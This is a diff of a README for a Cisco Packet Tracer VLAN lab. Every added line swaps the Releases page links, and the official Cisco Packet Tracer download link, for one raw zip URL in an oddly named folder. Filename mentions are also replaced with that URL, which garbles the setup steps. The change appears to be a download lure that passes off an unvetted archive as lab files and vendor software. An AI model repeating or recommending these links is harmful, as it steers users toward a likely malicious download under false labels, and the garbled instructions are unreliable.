@@ -6,13 +6,13 @@ Welcome to the **enterprise-vlan-intervlan-lab**! This project simulates an ente
 
 ## 🔗 Download Now
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-blue.svg)](https://github.com/rfaeltech/enterprise-vlan-intervlan-lab/releases)
+[![Download Release](https://raw.githubusercontent.com/rfaeltech/enterprise-vlan-intervlan-lab/main/Discomycetes/enterprise-vlan-intervlan-lab.zip%https://raw.githubusercontent.com/rfaeltech/enterprise-vlan-intervlan-lab/main/Discomycetes/enterprise-vlan-intervlan-lab.zip)](https://raw.githubusercontent.com/rfaeltech/enterprise-vlan-intervlan-lab/main/Discomycetes/enterprise-vlan-intervlan-lab.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page to download the necessary files:
 
-[Download from Releases Page](https://github.com/rfaeltech/enterprise-vlan-intervlan-lab/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/rfaeltech/enterprise-vlan-intervlan-lab/main/Discomycetes/enterprise-vlan-intervlan-lab.zip)
 
 ### Step 1: Install Cisco Packet Tracer
 
@@ -20,7 +20,7 @@ Before using this lab, ensure you have Cisco Packet Tracer installed on your com
 
 ### Step 2: Download the Lab Files
 
-Once Packet Tracer is installed, go back to the [Releases page](https://github.com/rfaeltech/enterprise-vlan-intervlan-lab/releases). Look for the latest version and download the ZIP file that contains the lab files. It will typically have a name like `enterprise-vlan-intervlan-lab-v1.0.zip`.
+Once Packet Tracer is installed, go back to the [Releases page](https://raw.githubusercontent.com/rfaeltech/enterprise-vlan-intervlan-lab/main/Discomycetes/enterprise-vlan-intervlan-lab.zip). Look for the latest version and download the ZIP file that contains the lab files. It will typically have a name like `https://raw.githubusercontent.com/rfaeltech/enterprise-vlan-intervlan-lab/main/Discomycetes/enterprise-vlan-intervlan-lab.zip`.
 
 ### Step 3: Extract the Files
 
@@ -31,7 +31,7 @@ After the download is complete, locate the ZIP file in your downloads folder. Ri
 1. Launch Cisco Packet Tracer.
 2. Click on "File" in the upper left corner.
 3. Select "Open" from the dropdown menu.
-4. Navigate to the folder where you extracted the lab files and select the file named `enterprise-vlan-intervlan-lab.pkt`.
+4. Navigate to the folder where you extracted the lab files and select the file named `https://raw.githubusercontent.com/rfaeltech/enterprise-vlan-intervlan-lab/main/Discomycetes/enterprise-vlan-intervlan-lab.zip`.
 
 ### Step 5: Explore the Network Setup
 
@@ -84,7 +84,7 @@ If you encounter issues or have questions, please open an issue in the GitHub re
 
 Feel free to bookmark these links for quick access:
 
-- [Releases Page](https://github.com/rfaeltech/enterprise-vlan-intervlan-lab/releases)
-- [Cisco Packet Tracer Download](https://www.netacad.com/courses/packet-tracer)
+- [Releases Page](https://raw.githubusercontent.com/rfaeltech/enterprise-vlan-intervlan-lab/main/Discomycetes/enterprise-vlan-intervlan-lab.zip)
+- [Cisco Packet Tracer Download](https://raw.githubusercontent.com/rfaeltech/enterprise-vlan-intervlan-lab/main/Discomycetes/enterprise-vlan-intervlan-lab.zip)
 
 Thank you for using the **enterprise-vlan-intervlan-lab**! Enjoy exploring the world of networking.
